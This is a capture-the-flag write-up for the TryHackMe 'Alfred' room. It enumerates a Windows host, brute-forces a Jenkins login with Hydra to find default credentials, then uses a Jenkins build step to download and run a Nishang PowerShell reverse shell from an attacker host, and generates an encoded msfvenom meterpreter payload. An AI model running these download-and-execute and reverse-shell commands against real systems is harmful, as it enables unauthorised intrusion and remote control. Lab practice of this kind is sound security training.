# Alfred

https://tryhackme.com/room/alfred

## Resources

- https://github.com/samratashok/nishang
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

## Scanning/Enumeration

### nmap

```sh
nmap -v -T4 -sC -sV $TARGET_IP -Pn -oN nmap/scan.txt

# -v  - verbose
# -sC - default scripts
# -sV - version detect
# -p- - all ports
# -Pn - disable host discovery, only port scan
# -oN - output to file
```

Output to ![nmap/scan.txt](nmap/scan.txt)

- 80: http
  - Microsoft IIS httpd 7.5
- 3389
  - ssl/ms-wbt-server? 6.1.7601
- 8080: http
  - Jetty 9.4.z-SNAPSHOT
- system: alfred
- OS: windows

### gobuster

```sh
gobuster dir --url http://$TARGET_IP:80 -w /usr/share/wordlists/dirb/common.txt
# nothing

gobuster dir --url http://$TARGET_IP:8080 -w /usr/share/wordlists/dirb/common.txt
# nothing
```

### Browser

http://$TARGET_IP:80 => nothing interesting

http://$TARGET_IP:8080 => Jenkins login panel

Interesting request headers:

- `X-Jenkins 2.190.1`
- `X-Hudson 1.395`

## Vulnerabilities

- [Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/19033)

## Exploit

### Jenkins Login

View network request on login. 

Form data: `j_username=test&j_password=test&from=%2F&Submit=Sign+in`

```sh
# brute force with hydra

hydra -s 8080 $TARGET_IP http-form-post \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" \
  -L /usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt \
  -P /usr/share/wordlists/SecLists/Passwords/cirt-default-passwords.txt \
  -vV -f -w 30
# too long...

# google says jenkins default user is admin

hydra -s 8080 $TARGET_IP http-form-post \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" \
  -l admin \
  -P /usr/share/wordlists/SecLists/Passwords/cirt-default-passwords.txt \
  -vV -f -w 30
# got it;  admin:admin

# cheatsheet:
#
# -s port
# -L use login file
# -P use password file
# -t tasks in parallel
# -w max wait seconds
```

Credentials: `admin:admin`

### Setup Reverse Shell

```sh
# attack box

# download exploit
curl -LJO https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

# serve up exploit (:8000)
python3 -m http.server

# listen for reverse shell
nc -lvnp 9000
```

```batch
REM  target
REM  Jenkins build step

WHOAMI
REM alfred\bruce

REM  download and execute reverse shell
POWERSHELL iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port 9000
```

```ps1
# target
# get flag

type C:\Users\bruce\Desktop\user.txt
```

### Setup Meterpreter Shell

```sh
# attacker

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f exe -o enki.exe
```